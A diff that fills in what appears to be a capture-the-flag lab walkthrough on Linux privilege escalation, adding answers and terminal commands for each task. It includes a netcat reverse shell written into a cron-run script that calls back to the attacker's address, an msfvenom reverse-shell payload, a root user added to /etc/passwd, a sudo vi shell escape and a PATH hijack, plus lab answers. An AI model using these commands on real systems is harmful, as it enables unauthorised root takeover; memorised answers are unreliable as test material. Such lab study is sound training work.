@@ -4,25 +4,49 @@
 
 ## Task 4
 
+🧰 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+(Terminal 1:)
+```shell
+python3 -m http.server 8000
+```
+
+(Terminal 2:)
+```shell
+ssh user3@10.10.178.20
+	yes
+	password
+	
+	wget http://10.14.27.197:8000/LinEnum.sh
+	chmod +x LinEnum.sh
+	
+	./LinEnum.sh
+```
+
+(Terminal 1/python3:)
+```shell
+	^C
+```
+
 ### Task 4.2
 
-> 
+> polobox
 
 ### Task 4.3
 
-> 
+> 8
 
 ### Task 4.4
 
-> 
+> 4
 
 ### Task 4.5
 
-> 
+> autoscript.sh
 
 ### Task 4.6
 
-> 
+> /etc/passwd
 
 <br>
 
@@ -30,59 +54,228 @@
 
 ### Task 5.1
 
-> 
+(Terminal 2/ssh:)
+```shell
+	ls -l
+```
+
+> /home/user3/shell
+
+<br>
+
+(Terminal 2/ssh:)
+```shell
+	./shell
+		whoami
+```
 
 <br>
 
 ## Task 6
 
+(Terminal 2/ssh:)
+```shell
+		exit
+	su user7
+		password
+```
+
 ### Task 6.2
 
-> 
+> vertical
 
 ### Task 6.3
 
-> 
+(Terminal 1:)
+```shell
+openssl passwd -1 -salt "new" "123"
+```
+
+> $1$new$p7ptkEKU1HnaHpRtzNizS1
 
 ### Task 6.4
 
-> 
+(Terminal 2/ssh:)
+```shell
+	cat /etc/passwd | grep 'root'
+```
+
+> new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+
+<br>
+
+(Terminal 2/ssh:)
+```shell
+	nano /etc/passwd
+```
+
+(add:)
+```text
+new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+```
+
+(Terminal 2/ssh:)
+```shell
+	su new
+		123
+```
 
 <br>
 
 ## Task 7
 
+🧰 https://gtfobins.github.io/
+
+(Terminal 2/ssh:)
+```shell
+	exit
+	su user8
+		password
+```
+
 ### Task 7.2
 
-> 
+(Terminal 2/ssh:)
+```shell
+	sudo -l
+```
+
+> NOPASSWD
+
+<br>
+
+(Terminal 2/ssh:)
+```shell
+	sudo vi
+		:!sh
+		^Enter
+```
 
 <br>
 
 ## Task 8
 
+(Terminal 2/ssh:)
+```shell
+	exit
+	:q
+	su user4
+		password
+```
+
 ### Task 8.3
 
-> 
+> -p
+
+<br>
+
+(Terminal 1:)
+```shell
+msfvenom -p cmd/unix/reverse_netcat lhost=10.14.27.197 lport=8888 R
+```
 
 ### Task 8.5
 
-> 
+(Terminal 2/ssh:)
+```shell
+	cat /etc/crontab
+```
+
+> /home/user4/Desktop
+
+<br>
+
+(Terminal 2/ssh:)
+```shell
+	echo 'mkfifo /tmp/zhygeeo; nc 10.14.27.197 8888 0</tmp/zhygeeo | /bin/sh >/tmp/zhygeeo 2>&1; rm /tmp/zhygeeo' > /home/user4/Desktop/autoscript.sh
+```
+
+(Terminal 1:)
+```shell
+nc -lvnp 8888
+
+	^C
+```
 
 <br>
 
 ## Task 9
 
+(Terminal 2/ssh:)
+```shell
+	su user5
+		password
+```
+
 ### Task 9.2
 
-> 
+(Terminal 2/ssh:)
+```shell
+	cd ~
+	
+	./script
+```
 
-### Task 9.4
-
-> 
-
-### Task 9.5
-
-> 
+> ls
 
 <br>
 
+(Terminal 2/ssh:)
+```shell
+	cd /tmp/
+```
+
+### Task 9.4
+
+(Terminal 2/ssh:)
+```shell
+	echo "/bin/bash" > ls
+```
+
+> echo "/bin/bash" > ls
+
+(Terminal 2/ssh:)
+```shell
+	chmod +x ls
+```
+
+### Task 9.5
+
+> chmod +x ls
+
+<br>
+
+(Terminal 2/ssh:)
+```shell
+	export PATH=/tmp:$PATH
+	
+	ls
+		whoami
+		/bin/ls
+		exit
+	
+	cd ~
+	
+	./script
+		
+		whoami
+		exit
+	
+	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
+	
+	ls
+```
+
+<br>
+
+## Task 10
+
+https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+
+https://payatu.com/guide-linux-privilege-escalation
+
+<br>
